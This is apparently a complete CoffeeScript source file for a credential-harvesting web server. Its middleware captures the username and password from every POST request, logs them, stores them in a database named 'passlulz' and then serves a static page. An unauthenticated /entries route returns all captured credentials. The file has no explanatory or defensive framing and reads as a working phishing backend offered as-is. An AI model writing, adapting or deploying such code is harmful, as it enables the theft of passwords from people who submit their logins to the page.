restify = require 'restify'
ejdb = require "ejdb"
jb = ejdb.open "passlulz"

logPassword = ->
  (req, res, next) ->
    if req?.method is 'POST'
      req.method = 'GET'
      username = req.params.username
      password = req.params.password
      entry = {username, password}
      console.log entry

      jb.save 'entries', entry, (err, object_ids) ->
        if err
          console.error(err)
        else
          console.log "object_id #{entry['_id']}"
    next()

getEntries = (req, res, next) ->
  jb.find 'entries', (err, cursor, count) ->
    if err
      console.error(err)
      res.send err
    else
      entries = []
      while cursor.next()
        entries.push cursor.object()
      res.send entries

# Server Options
server = restify.createServer()
server.pre restify.pre.userAgentConnection()
server.use restify.acceptParser server.acceptable
server.use restify.fullResponse()
server.use restify.bodyParser()
server.use restify.gzipResponse()
server.use logPassword()

server.get '/entries', getEntries

# Static files
server.get /\/*/, restify.serveStatic directory: './static', default: 'index.html', charSet: 'UTF-8'
server.post /\/*/, restify.serveStatic directory: './static', default: 'index.html', charSet: 'UTF-8'

process.on 'exit', ->
  console.log 'closing db'
  jb.close()

server.listen process.env.PORT or 80, ->
  console.log "[%s] #{server.name} listening at #{server.url}", process.pid